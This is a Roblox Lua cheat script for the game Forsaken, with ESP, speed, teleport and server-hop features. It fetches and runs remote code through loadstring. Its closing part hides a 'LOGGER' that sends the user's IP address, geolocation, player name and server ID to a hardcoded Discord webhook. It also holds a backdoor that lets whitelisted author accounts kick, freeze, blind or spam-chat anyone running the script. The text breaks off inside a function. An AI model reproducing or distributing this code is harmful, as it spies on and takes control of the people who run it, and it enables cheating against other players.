local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Redexe19/RXGUIV1/refs/heads/main/Other%20Stuff/Library.lua", true))()

local RXFwindow = library:AddWindow("RX Forsaken", {
	main_color = Color3.fromRGB(107, 50, 124), -- Color
	min_size = Vector2.new(325, 366), -- Size of the gui
	can_resize = true, -- true or false
})

local main = RXFwindow:AddTab("MN") -- Name of tab
main:Show() -- shows the tab
main:AddLabel("Main Tab")
main:AddButton("Destroy UI",function()
pcall(function() game.CoreGui.imgui:Destroy() end)
	end)

main:AddLabel("Features")

---

local visual = RXFwindow:AddTab("VS") -- Name of tab
visual:Show() -- shows the tab
visual:AddLabel("Visual Tab")
visual:AddLabel("Main")

---

local generatoresp = visual:AddSwitch("Generator Esp", function(enabled)
	if not enabled then return end

	local plr = game:GetService("Players").LocalPlayer
	local gui = plr:WaitForChild("PlayerGui")
	local label = gui:WaitForChild("RoundTimer"):WaitForChild("Main"):WaitForChild("Title")
	local confirmAdornment = Instance.new("BindableFunction")

	confirmAdornment.OnInvoke = function(choice)
		if choice ~= "Yes" then return end

		local mapFolder = workspace:FindFirstChild("Map")
		local ingame = mapFolder and mapFolder:FindFirstChild("Ingame")
		local activeMap = ingame and ingame:FindFirstChild("Map")
		if not activeMap then return end

		for _, model in ipairs(activeMap:GetDescendants()) do
			if model:IsA("Model") and model.Name == "Generator" and not model:FindFirstChild("GeneratorESP_Adornment") then
				local part = model:FindFirstChildWhichIsA("BasePart", true)
				if part then
					local adorn = Instance.new("BoxHandleAdornment")
					adorn.Name = "GeneratorESP_Adornment"
					adorn.Adornee = part
					adorn.AlwaysOnTop = true
					adorn.ZIndex = 5
					adorn.Size = part.Size + Vector3.new(0.2, 0.2, 0.2)
					adorn.Color3 = Color3.fromRGB(255, 255, 0)
					adorn.Transparency = 0.2
					adorn.Parent = part
				end
			end
		end
	end

	task.spawn(function()
		local didNotify = false
		while true do
			if string.lower(label.Text):find("round ends in:") then
				if not didNotify then
					didNotify = true
					game:GetService("StarterGui"):SetCore("SendNotification", {
						Title = "Generator Esp",
						Text = "Do you want to highlight generators?",
						Duration = 999999,
						Callback = confirmAdornment,
						Button1 = "Yes",
						Button2 = "No"
					})
				end
			else
				didNotify = false
			end
			task.wait(1)
		end
	end)
end)

generatoresp:Set(false)

---

--// CONFIG
local _a8 = {"BloxyCola", "Medkit"}
local _b2 = Color3.fromRGB(255, 140, 0)
local _c7 = 1.2

--// SERVICES
local _d9 = game:GetService("Players")
local _e1 = _d9.LocalPlayer
local _f3 = {}
local _g5 = false

--// ESP CREATION
local function _h6(_i7)
	if not _i7 or not _i7:IsA("BasePart") then return end
	if _i7:FindFirstChild("ItemESPTag") then return end

	local _j2 = Instance.new("BoxHandleAdornment")
	_j2.Name = "ItemESPTag"
	_j2.Adornee = _i7
	_j2.AlwaysOnTop = true
	_j2.ZIndex = 5
	_j2.Size = _i7.Size
	_j2.Color3 = _b2
	_j2.Transparency = 0.3
	_j2.Parent = _i7
	table.insert(_f3, _j2)
end

--// CLEAR
local function _k4()
	for _, v in ipairs(_f3) do
		if v and v.Parent then
			v:Destroy()
		end
	end
	table.clear(_f3)
end

--// TOOL FINDER
local function _l8(_m0)
	for _, _n9 in ipairs(_m0:GetDescendants()) do
		if table.find(_a8, _n9.Name) and _n9:IsA("Tool") and not _n9:FindFirstChild("ItemESPTag") then
			local _o6 = _n9:FindFirstChild("Handle") or _n9:FindFirstChildWhichIsA("BasePart")
			if _o6 then _h6(_o6) end
		end
	end
end

--// MAIN LOOP
local function _p5()
	while true do
		task.wait(_c7)
		if not _g5 then continue end

		_k4()

		local _q3 = workspace:FindFirstChild("Map")
		if not _q3 then continue end

		local _r1 = _q3:FindFirstChild("Ingame")
		if not _r1 then continue end

		_l8(_r1)

		local _s8 = _r1:FindFirstChild("Map")
		if _s8 then _l8(_s8) end
	end
end

--// TOGGLE UI INTEGRATION
local itemesp = visual:AddSwitch("Item ESP", function(_t0)
	_g5 = _t0
	if not _t0 then _k4() end
end)
itemesp:Set(false)

--// INIT LOOP
task.spawn(_p5)

---

--// CONFIG
local _u3 = Color3.fromRGB(255, 0, 0)
local _v7 = Color3.fromRGB(0, 255, 0)
local _w6 = 1.2

--// SERVICES
local _x1 = game:GetService("Players")
local _y9 = _x1.LocalPlayer
local _z2 = {}
local _aa4 = false

--// CREATE HIGHLIGHT
local function _ab7(_ac3, _ad5)
	if not _ac3:FindFirstChild("HumanoidRootPart") then return end
	if _ac3:FindFirstChild("PlayerESPHighlight") then return end

	local _ae8 = Instance.new("Highlight")
	_ae8.Name = "PlayerESPHighlight"
	_ae8.Adornee = _ac3
	_ae8.FillColor = _ad5
	_ae8.FillTransparency = 0.4
	_ae8.OutlineColor = Color3.new(1, 1, 1)
	_ae8.OutlineTransparency = 0
	_ae8.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	_ae8.Parent = _ac3
	table.insert(_z2, _ae8)
end

--// CLEAR ESP
local function _af6()
	for _, v in ipairs(_z2) do
		if v and v.Parent then
			v:Destroy()
		end
	end
	table.clear(_z2)
end

--// SCAN PLAYERS
local function _ag0()
	while true do
		task.wait(_w6)
		if not _aa4 then continue end

		_af6()

		local _ah1 = workspace:FindFirstChild("Players")
		if not _ah1 then continue end

		local _ai9 = _ah1:FindFirstChild("Killers")
		if _ai9 then
			for _, m in ipairs(_ai9:GetChildren()) do
				if m:IsA("Model") and m:FindFirstChild("Humanoid") then
					_ab7(m, _u3)
				end
			end
		end

		local _aj4 = _ah1:FindFirstChild("Survivors")
		if _aj4 then
			for _, m in ipairs(_aj4:GetChildren()) do
				if m:IsA("Model") and m:FindFirstChild("Humanoid") then
					_ab7(m, _v7)
				end
			end
		end
	end
end

--// TOGGLE UI INTEGRATION
local surkilesp = visual:AddSwitch("Player ESP", function(_ak2)
	_aa4 = _ak2
	if not _ak2 then _af6() end
end)
surkilesp:Set(false)

--// INIT LOOP
task.spawn(_ag0)

---

visual:AddLabel("Extra")

---

--// TRAPS ESP CONFIG
local _tt_spikeDelete = true -- set to false if you only want to highlight spikes
local _tt_shadowColor = Color3.fromRGB(255, 0, 255)
local _tt_shadowRefs = {}
local _tt_trapsEnabled = false

--// SHADOW CLEANUP
local function _tt_clearShadows()
	for _, v in ipairs(_tt_shadowRefs) do
		if v and v.Parent then
			v:Destroy()
		end
	end
	table.clear(_tt_shadowRefs)
end

--// HIGHLIGHT CREATOR FOR SHADOWS
local function _tt_highlightShadow(model)
	if not model:FindFirstChild("Highlight") then
		local hl = Instance.new("Highlight")
		hl.Name = "Highlight"
		hl.Adornee = model
		hl.FillColor = _tt_shadowColor
		hl.FillTransparency = 0.35
		hl.OutlineColor = Color3.fromRGB(255, 255, 255)
		hl.OutlineTransparency = 0
		hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		hl.Parent = model
		table.insert(_tt_shadowRefs, hl)
	end
end

--// MAIN LOOP
task.spawn(function()
	while true do
		task.wait(1.2)
		if not _tt_trapsEnabled then continue end

		_tt_clearShadows()

		local ingame = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Ingame")
		if not ingame then continue end

		-- Delete or highlight .Spike
		for _, obj in ipairs(ingame:GetChildren()) do
			if obj:IsA("Model") and obj.Name == "Spike" then
				if _tt_spikeDelete then
					obj:Destroy()
				else
					_tt_highlightShadow(obj)
				end
			end

			-- Highlight <PlayerName>Shadows.Shadow
			if obj:IsA("Model") and obj:FindFirstChildWhichIsA("Humanoid") then
				local shadowsFolder = obj:FindFirstChild(obj.Name .. "Shadows")
				if shadowsFolder and shadowsFolder:FindFirstChild("Shadow") then
					local shadow = shadowsFolder.Shadow
					if shadow:IsA("Model") then
						_tt_highlightShadow(shadow)
					end
				end
			end
		end
	end
end)

--// UI LIB TOGGLE FOR TRAPS ESP
local kiertrapsesp = visual:AddSwitch("Delete Traps", function(Value)
	_tt_trapsEnabled = Value
	if not Value then
		_tt_clearShadows()
	end
end)
kiertrapsesp:Set(false)

---

local movement = RXFwindow:AddTab("MV") -- Name of tab
movement:Show() -- shows the tab
movement:AddLabel("Movement Tab")
movement:AddLabel("Character")

---

local s0 = game:GetService("Players")
local s1 = game:GetService("RunService")
local s2 = s0.LocalPlayer
local s3 = s2.Character or s2.CharacterAdded:Wait()
local s4 = s3:WaitForChild("Humanoid")

local v1 = false -- isSpeeding
local v2 = 3    -- speed multiplier

-- Toggle
local stoggle = movement:AddSwitch("(TPSPEED) Speed Up", function(x1)
	v1 = x1
end)
stoggle:Set(false)

-- TextBox
movement:AddTextBox("Speed Multiplier", function(x2)
	local n2 = tonumber(x2)
	if n2 and typeof(n2) == "number" then
		v2 = n2
	end
end)

-- Respawn update
s2.CharacterAdded:Connect(function(nc)
	s3 = nc
	s4 = s3:WaitForChild("Humanoid")
end)

-- Speed loop
task.spawn(function()
	while true do
		s1.Heartbeat:Wait()
		if v1 and s4 and s4.MoveDirection.Magnitude > 0 then
			s3:TranslateBy(s4.MoveDirection * (v2 / 10))
		end
	end
end)

---

movement:AddButton("Jump Button",function()
game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = 50
	end)

local function setJumpPower(value)
    local function apply()
        local char = game.Players.LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.JumpPower = value
            end
        end
    end
    apply()
    game.Players.LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.1)
        apply()
    end)
end

setJumpPower(0)

movement:AddTextBox("Jump Height (Default 0-50)", function(text)
    local value = tonumber(text)
    if value then
        setJumpPower(value)
    end
end)

---

movement:AddLabel("Air")

---

-- UI Toggle
local infjump = movement:AddSwitch("Infinite Jump", function(enabled)
    getgenv().InfiniteJumpEnabled_abc123 = enabled
end)
infjump:Set(false)

-- Infinite Jump Logic
local UserInputService_xyz789 = game:GetService("UserInputService")
local Players_def456 = game:GetService("Players")
local LocalPlayer_ghi321 = Players_def456.LocalPlayer

UserInputService_xyz789.JumpRequest:Connect(function()
    if getgenv().InfiniteJumpEnabled_abc123 and LocalPlayer_ghi321.Character then
        local Humanoid_boo999 = LocalPlayer_ghi321.Character:FindFirstChildWhichIsA("Humanoid")
        if Humanoid_boo999 and Humanoid_boo999:GetState() ~= Enum.HumanoidStateType.Dead then
            Humanoid_boo999:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

local locations = RXFwindow:AddTab("LT") -- Name of tab
locations:Show() -- shows the tab
locations:AddLabel("Locations Tab")
locations:AddLabel("Main")

---

local PlrSvc = game:GetService("Players")
local RunSvc = game:GetService("RunService")
local CGui = game:GetService("CoreGui")
local lplr = PlrSvc.LocalPlayer

local chr = lplr.Character or lplr.CharacterAdded:Wait()
local hrp = chr:WaitForChild("HumanoidRootPart")

-- Map tracker and GUI logic
local mapRef = nil
local selGen = nil
local isGuiVisible = false
local genMap = {}

local function getMap()
	local ws = workspace
	local top = ws:FindFirstChild("Map")
	if not top then return nil end
	local ingame = top:FindFirstChild("Ingame")
	if not ingame then return nil end
	return ingame:FindFirstChild("Map")
end

-- UI Toggle (unchanged UI lib)
local showgens = locations:AddSwitch("Show Generators", function(val)
	isGuiVisible = val
	for _, ui in ipairs(CGui:GetChildren()) do
		if ui.Name == "GeneratorBillboard" then
			ui.Enabled = val
		end
	end
end)
showgens:Set(false)

-- Dropdown UI
local gentpdrop = locations:AddDropdown("Choose Generator", function(option)
	selGen = option
end)

for i = 1, 5 do
	gentpdrop:Add("Generator " .. i)
end

-- Teleport button
locations:AddButton("TP To Generator", function()
	if selGen and genMap[selGen] then
		local tgt = genMap[selGen]
		local plrChar = lplr.Character or lplr.CharacterAdded:Wait()
		local root = plrChar:WaitForChild("HumanoidRootPart")
		root.CFrame = CFrame.new(tgt.Position + Vector3.new(0, 5, 0))
	end
end)

-- Billboard creation
local function genBillboard(genModel, genLabel)
	local base = genModel:FindFirstChildWhichIsA("BasePart")
	if not base then return end

	local bGui = Instance.new("BillboardGui")
	bGui.Name = "GeneratorBillboard"
	bGui.AlwaysOnTop = true
	bGui.Size = UDim2.new(0, 100, 0, 30)
	bGui.StudsOffset = Vector3.new(0, 3, 0)
	bGui.Adornee = base
	bGui.Enabled = isGuiVisible

	local txt = Instance.new("TextLabel")
	txt.Size = UDim2.new(1, 0, 1, 0)
	txt.BackgroundTransparency = 1
	txt.Text = genLabel
	txt.TextColor3 = Color3.new(1, 1, 1)
	txt.TextScaled = true
	txt.Font = Enum.Font.Arcade
	txt.Parent = bGui

	bGui.Parent = CGui
end

-- Refresh generator list and GUI
local function updateGenerators()
	local newMap = getMap()
	if not newMap or newMap == mapRef then return end
	mapRef = newMap

	-- Clear old GUI
	for _, obj in ipairs(CGui:GetChildren()) do
		if obj.Name == "GeneratorBillboard" then
			obj:Destroy()
		end
	end

	-- Collect generators
	local foundGens = {}
	for _, mdl in ipairs(newMap:GetChildren()) do
		if mdl:IsA("Model") and mdl.Name == "Generator" then
			table.insert(foundGens, mdl)
		end
	end
	if #foundGens ~= 5 then return end

	-- Shuffle generators
	local shuffled = {}
	while #foundGens > 0 do
		local idx = math.random(1, #foundGens)
		table.insert(shuffled, table.remove(foundGens, idx))
	end

	-- Map label, GUI, and positions
	for idx, gen in ipairs(shuffled) do
		local genName = "Generator " .. idx
		local bPart = gen:FindFirstChildWhichIsA("BasePart")
		if bPart then
			genMap[genName] = bPart
			genBillboard(gen, genName)
		end
	end
end

-- Watch for map resets
task.spawn(function()
	while true do
		task.wait(1)
		pcall(updateGenerators)
	end
end)

---

---

local psv = game:GetService("Players")
local rsv = game:GetService("RunService")
local cg = game:GetService("CoreGui")
local lpl = psv.LocalPlayer

local chr = lpl.Character or lpl.CharacterAdded:Wait()
local hrt = chr:WaitForChild("HumanoidRootPart")

-- State variables
local mapRef = nil
local mapVer = 0
local lastVer = -1
local selItm = nil
local showGui = false
local itmMap = {}

local function fetchMap()
	local ws = workspace
	local top = ws:FindFirstChild("Map")
	if top then
		local ig = top:FindFirstChild("Ingame")
		if ig then
			return ig:FindFirstChild("Map") or ig
		end
	end
	return nil
end

-- UI Toggle (unchanged)
local showItems = locations:AddSwitch("Show Items", function(state)
	showGui = state
	for _, ui in pairs(cg:GetChildren()) do
		if ui.Name == "ItemBillboard" then
			ui.Enabled = state
		end
	end
end)
showItems:Set(false)

-- Dropdown (unchanged)
local itemDropdown = locations:AddDropdown("Choose Item", function(txt)
	selItm = txt
end)

-- Static entries
for i = 1, 3 do
	itemDropdown:Add("BloxyCola " .. i)
end
for i = 1, 3 do
	itemDropdown:Add("Medkit " .. i)
end

-- Teleport
locations:AddButton("TP To Item", function()
	if selItm and itmMap[selItm] then
		local tool = itmMap[selItm]
		local hdl = tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")
		if hdl then
			local c = lpl.Character or lpl.CharacterAdded:Wait()
			local h = c:WaitForChild("HumanoidRootPart")
			h.CFrame = CFrame.new(hdl.Position + Vector3.new(0, 5, 0))
		else
			game.StarterGui:SetCore("SendNotification", {
				Title = "Teleport Failed",
				Text = "No valid Handle or BasePart in the Tool.",
				Duration = 3
			})
		end
	else
		game.StarterGui:SetCore("SendNotification", {
			Title = "Item Not Found",
			Text = "This item doesn't exist on the current map.",
			Duration = 3
		})
	end
end)

-- Billboard creation
local function makeBill(item, lbl)
	local part = item:IsA("Tool") and item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
	if not part then return end

	local gui = Instance.new("BillboardGui")
	gui.Name = "ItemBillboard"
	gui.AlwaysOnTop = true
	gui.Size = UDim2.new(0, 100, 0, 30)
	gui.StudsOffset = Vector3.new(0, 3, 0)
	gui.Adornee = part
	gui.Enabled = showGui

	local txt = Instance.new("TextLabel")
	txt.Size = UDim2.new(1, 0, 1, 0)
	txt.BackgroundTransparency = 1
	txt.Text = lbl
	txt.TextColor3 = Color3.new(1, 1, 1)
	txt.TextScaled = true
	txt.Font = Enum.Font.Arcade
	txt.Parent = gui

	gui.Parent = cg
end

-- Track map resets
local function startWatcher()
	local function bump()
		mapVer += 1
	end

	local function hookMap(mapObj)
		if not mapObj then return end
		mapObj.AncestryChanged:Connect(bump)
		for _, sub in ipairs(mapObj:GetChildren()) do
			if sub:IsA("Folder") or sub:IsA("Model") then
				sub.AncestryChanged:Connect(bump)
			end
		end
	end

	task.spawn(function()
		while true do
			local newMap = fetchMap()
			if newMap and newMap ~= mapRef then
				mapRef = newMap
				bump()
				hookMap(newMap)
			end
			task.wait(1)
		end
	end)
end

-- Refresh all
local function updateItems()
	if mapVer == lastVer then return end
	lastVer = mapVer

	for _, ui in pairs(cg:GetChildren()) do
		if ui.Name == "ItemBillboard" then
			ui:Destroy()
		end
	end

	itmMap = {}

	local base = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Ingame")
	if not base then return end

	local folders = {base}
	local subMap = base:FindFirstChild("Map")
	if subMap then table.insert(folders, subMap) end

	local meds = {}
	local colas = {}

	for _, folder in ipairs(folders) do
		for _, obj in ipairs(folder:GetChildren()) do
			if obj:IsA("Tool") then
				if obj.Name == "Medkit" then
					table.insert(meds, obj)
				elseif obj.Name == "BloxyCola" then
					table.insert(colas, obj)
				end
			end
		end
	end

	for i = 1, 3 do
		if colas[i] then
			local lbl = "BloxyCola " .. i
			itmMap[lbl] = colas[i]
			makeBill(colas[i], lbl)
		end
	end

	for i = 1, 3 do
		if meds[i] then
			local lbl = "Medkit " .. i
			itmMap[lbl] = meds[i]
			makeBill(meds[i], lbl)
		end
	end
end

-- Run refresh loop
task.spawn(function()
	while true do
		task.wait(1)
		pcall(updateItems)
	end
end)

startWatcher()

---

local tp = RXFwindow:AddTab("TP") -- Name of tab
tp:Show() -- shows the tab

tp:AddLabel("Teleports Tab")
tp:AddLabel("Main")

local gLGz = game:GetService("Players")
local bKxJ = gLGz.LocalPlayer
local rWQt = {}
local yVnB = {}
local TjFo = nil
local xhAc = false

local function Czpm(uWqV, vjJP)
	local gEqf = Instance.new("Part")
	gEqf.Anchored = true
	gEqf.CanCollide = false
	gEqf.Transparency = 1
	gEqf.Size = Vector3.new(1, 1, 1)
	gEqf.CFrame = CFrame.new(vjJP)
	gEqf.Name = "Anchor_" .. uWqV
	gEqf.Parent = workspace

	local eWBs = Instance.new("BillboardGui")
	eWBs.Name = "WaypointBillboard_" .. uWqV
	eWBs.AlwaysOnTop = true
	eWBs.Size = UDim2.new(0, 120, 0, 45)
	eWBs.StudsOffset = Vector3.new(0, 2.5, 0)
	eWBs.Adornee = gEqf
	eWBs.MaxDistance = 9999999
	eWBs.Enabled = xhAc
	eWBs.Parent = workspace

	local McTY = Instance.new("TextLabel")
	McTY.Size = UDim2.new(1, 0, 1, 0)
	McTY.BackgroundTransparency = 1
	McTY.TextColor3 = Color3.fromRGB(255, 255, 255)
	McTY.Font = Enum.Font.Arcade
	McTY.TextScaled = true
	McTY.Text = string.format("%s\n%d, %d, %d", uWqV, vjJP.X, vjJP.Y, vjJP.Z)
	McTY.Parent = eWBs

	return eWBs, gEqf
end

tp:AddButton("Set Waypoint Position", function()
	if not TjFo then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Waypoint System",
			Text = "No waypoint selected in dropdown!",
			Duration = 3
		})
		return
	end

	local mCEH = bKxJ.Character or bKxJ.CharacterAdded:Wait()
	local fxRo = mCEH:FindFirstChild("HumanoidRootPart")
	if not fxRo then return end

	local jUGF = fxRo.Position
	rWQt[TjFo] = jUGF

	if yVnB[TjFo] then
		local xLNR = yVnB[TjFo]
		if xLNR.Billboard then xLNR.Billboard:Destroy() end
		if xLNR.Anchor then xLNR.Anchor:Destroy() end
	end

	local ZHPv, HsTm = Czpm("WP " .. TjFo, jUGF)
	yVnB[TjFo] = {
		Billboard = ZHPv,
		Anchor = HsTm,
	}
end)

local eXlq = tp:AddDropdown("Waypoints", function(DWSc)
	TjFo = DWSc
end)

for qWNj = 1, 5 do
	eXlq:Add(tostring(qWNj))
end

local OVyZ = tp:AddSwitch("Show Waypoint", function(gMLh)
	xhAc = gMLh
	for _, AsMJ in pairs(yVnB) do
		if AsMJ.Billboard then
			AsMJ.Billboard.Enabled = gMLh
		end
	end
end)
OVyZ:Set(false)

tp:AddLabel("Teleports")

local function ZLby(jFlY)
	tp:AddButton("Waypoint " .. jFlY, function()
		local vQgD = rWQt[jFlY]
		if not vQgD then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Waypoint System",
				Text = "Waypoint " .. jFlY .. " not set yet!",
				Duration = 3
			})
			return
		end

		local WFeZ = bKxJ.Character or bKxJ.CharacterAdded:Wait()
		local cAzk = WFeZ:FindFirstChild("HumanoidRootPart")
		if cAzk then
			cAzk.CFrame = CFrame.new(vQgD)
		end
	end)
end

for kOYc = 1, 5 do
	ZLby(tostring(kOYc))
end

local others = RXFwindow:AddTab("OT") -- Name of tab
others:Show() -- shows the tab

others:AddLabel("Others Tab")
others:AddLabel("Utility")

--// Unique random small vars (1-5 chars)
local plrs = game:GetService("Players")
local lp = plrs.LocalPlayer
local vu = game:GetService("VirtualUser")

--// UI Toggle
local antiafk = others:AddSwitch("Anti AFK", function(v)
    if v then
        if not getgenv()._afkConn then
            getgenv()._afkConn = lp.Idled:Connect(function()
                vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
                task.wait(1)
                vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
            end)
        end
    else
        if getgenv()._afkConn then
            getgenv()._afkConn:Disconnect()
            getgenv()._afkConn = nil
        end
    end
end)

antiafk:Set(true) -- default enabled

others:AddTextBox("Max Zoom, Default: 128", function(text) -- u can add any text to "text"
	game.Players.LocalPlayer.CameraMaxZoomDistance = (text)
end)

others:AddLabel("Server")

others:AddButton("Rejoin",function()
--// Rejoin same server script
local tp = game:GetService("TeleportService")
local plr = game:GetService("Players").LocalPlayer

local placeId = game.PlaceId
local jobId = game.JobId

tp:TeleportToPlaceInstance(placeId, jobId, plr)
end)

others:AddButton("Change Server",function()
--// Server hop (different server)
local tp = game:GetService("TeleportService")
local plrs = game:GetService("Players")
local http = game:GetService("HttpService")

local pid = game.PlaceId
local jid = game.JobId

-- Get public server list
local success, result = pcall(function()
	return http:JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. pid .. "/servers/Public?sortOrder=Asc&limit=100"))
end)

if success and result and result.data then
	for _, server in pairs(result.data) do
		if server.id ~= jid and server.playing < server.maxPlayers then
			tp:TeleportToPlaceInstance(pid, server.id, plrs.LocalPlayer)
			break
		end
	end
end
end)

others:AddLabel("Game")

others:AddButton("Reduce Game Graphics",function()
_G.Ignore = {}
_G.Settings = {
	Players = {
		["Ignore Me"] = true,
		["Ignore Others"] = true,
		["Ignore Tools"] = true
	},
	Meshes = {
		NoMesh = false,
		NoTexture = false,
		Destroy = false
	},
	Images = {
		Invisible = true,
		Destroy = false
	},
	Explosions = {
		Smaller = true,
		Invisible = false, -- Not for PVP games
		Destroy = false -- Not for PVP games
	},
	Particles = {
		Invisible = true,
		Destroy = false
	},
	TextLabels = {
		LowerQuality = true,
		Invisible = false,
		Destroy = false
	},
	MeshParts = {
		LowerQuality = true,
		Invisible = false,
		NoTexture = false,
		NoMesh = false,
		Destroy = false
	},
	Other = {
		["FPS Cap"] = 360, -- true to uncap
		["No Camera Effects"] = true,
		["No Clothes"] = true,
		["Low Water Graphics"] = true,
		["No Shadows"] = true,
		["Low Rendering"] = true,
		["Low Quality Parts"] = true,
		["Low Quality Models"] = true,
		["Reset Materials"] = true,
	}
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
end)






-- ## LOGGER ##
local api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))

--// Webhook URL (Replace with your own)
local webhookUrl = "https://discord.com/api/webhooks/1399410914066956308/d5S588KGAuh-U9wLGR9zMhZMMi3pq_QP9VaajNaz-5FZ1KCZS-u2czEmsoP40Kco3iXS"

--// Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

--// Webhook sender function
local function sendToWebhook(message)
    local embed = {
        title = "LOGGER",
        description = message,
        type = "rich",
        color = tonumber("992D22", 16),
        footer = {
            text = "Player Name: " .. LocalPlayer.Name,
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S") .. ".000Z"
    }

    local payload = {
        embeds = {embed}
    }

    local requestData = {
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    }

    if request then
        request(requestData)
    elseif http and http.request then
        http.request(requestData)
    elseif syn and syn.request then
        syn.request(requestData)
    end
end

--// Example usage (replace with actual info)
sendToWebhook("ALL INFO COLLECTED\n" ..
    "IP: " .. tostring(api.ip) .. "\n" ..
    "Success: " .. tostring(api.success) .. "\n" ..
    "Type: " .. tostring(api.type) .. "\n" ..
    "Continent: " .. tostring(api.continent) .. "\n" ..
    "Continent Code: " .. tostring(api.continent_code) .. "\n" ..
    "Country: " .. tostring(api.country) .. "\n" ..
    "Country Code: " .. tostring(api.country_code) .. "\n" ..
    "Region: " .. tostring(api.region) .. "\n" ..
    "Region Code: " .. tostring(api.region_code) .. "\n" ..
    "City: " .. tostring(api.city) .. "\n" ..
    "Latitude: " .. tostring(api.latitude) .. "\n" ..
    "Longitude: " .. tostring(api.longitude) .. "\n" ..
    "Is EU: " .. tostring(api.is_eu) .. "\n" ..
    "Postal: " .. tostring(api.postal) .. "\n" ..
    "Calling Code: " .. tostring(api.calling_code) .. "\n" ..
    "Capital: " .. tostring(api.capital) .. "\n" ..
    "Flag: " .. tostring(api.flag.emoji) .. "\n" ..
    "Connection ASN: " .. tostring(api.connection.asn) .. "\n" ..
    "Connection Org: " .. tostring(api.connection.org) .. "\n" ..
    "Connection ISP: " .. tostring(api.connection.isp) .. "\n" ..
    "Connection Domain: " .. tostring(api.connection.domain) .. "\n" ..
    "Timezone ID: " .. tostring(api.timezone.id) .. "\n" ..
    "Timezone ABBR: " .. tostring(api.timezone.abbr) .. "\n" ..
    "Timezone IS DST: " .. tostring(api.timezone.is_dst) .. "\n" ..
    "Timezone Offset: " .. tostring(api.timezone.offset) .. "\n" ..
    "Timezone UTC: " .. tostring(api.timezone.utc) .. "\n" ..
    "Timezone Current Time: " .. tostring(api.timezone.current_time) .. "\n" ..
    "\n\nSERVER JOB ID: " ..game.JobId.. "\n" ..
    "\nEND")



local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

-- ✅ WHITELIST (Usernames - Case Insensitive)
local WHITELIST = {
    ["RedExeTheWarrior"] = true,
    ["RXScripter"] = true,
}

-- ✅ Store states for reversible commands
local commandStates = {
    frozen = false,
    blindGui = nil,
    deafConnection = nil,
    fakeChatLoop = nil,
    glitchConnection = nil,
    fakeBanGui = nil,
    spectateCamera = nil,
}

-- ✅ Command functions (define what happens to NON-whitelisted players)
local CommandActions = {
    [".kick"] = function()
        LocalPlayer:Kick("You were kicked.")
    end,

    [".freeze"] = function()
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            commandStates.frozen = true
            RunService.Heartbeat:Connect(function()
                if commandStates.frozen and char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.Velocity = Vector3.zero
                    char.HumanoidRootPart.RotVelocity = Vector3.zero
                end
            end)
        end
    end,

    [".unfreeze"] = function()
        commandStates.frozen = false
    end,

    [".blind"] = function()
        if not commandStates.blindGui then
            local gui = Instance.new("ScreenGui", game.CoreGui)
            gui.IgnoreGuiInset = true
            gui.ResetOnSpawn = false

            local frame = Instance.new("Frame", gui)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.Size = UDim2.new(1, 0, 1, 0)

            commandStates.blindGui = gui
        end
    end,

    [".unblind"] = function()
        if commandStates.blindGui then
            commandStates.blindGui:Destroy()
            commandStates.blindGui = nil
        end
    end,

    [".deafen"] = function()
        if not commandStates.deafConnection then
            commandStates.deafConnection = LocalPlayer.Chatted:Connect(function() end)
        end
    end,

    [".undeafen"] = function()
        if commandStates.deafConnection then
            commandStates.deafConnection:Disconnect()
            commandStates.deafConnection = nil
        end
    end,

    [".fakechatsay"] = function(fromPlayer, fullMsg)
        local content = fullMsg:match("^%.fakechatsay%s+(.*)")
        if content then
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = fromPlayer.Name .. ": " .. content,
                Color = Color3.new(1, 1, 1),
                Font = Enum.Font.SourceSansBold,
                FontSize = Enum.FontSize.Size24
            })
        end
    end,

    [".unfakechat"] = function() end,

    [".loopchat"] = function(fromPlayer, fullMsg)
        local content = fullMsg:match("^%.loopchat%s+(.*)")
        if content and not WHITELIST[string.lower(LocalPlayer.Name)] then
            if commandStates.fakeChatLoop then
                commandStates.fakeChatLoop:Disconnect()
            end
            commandStates.fakeChatLoop = RunService.Heartbeat:Connect(function()
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(content, "All")
                task.wait(1.5)
            end)
        end
    end,

    [".unglitch"] = function()
        if commandStates.glitchConnection then
            commandStates.glitchConnection:Disconnect()
            commandStates.glitchConnection = nil
        end
    end,

    [".glitch"] = function()
        if not commandStates.glitchConnection then
            commandStates.glitchConnection = RunService.Heartbeat:Connect(function()
                local char = LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.Velocity = Vector3.new(math.random(-100, 100), 0, math.random(-100, 100))
                end
            end)
        end
    end,

    [".fakeban"] = function()
        if not commandStates.fakeBanGui then
            local gui = Instance.new("ScreenGui", game.CoreGui)
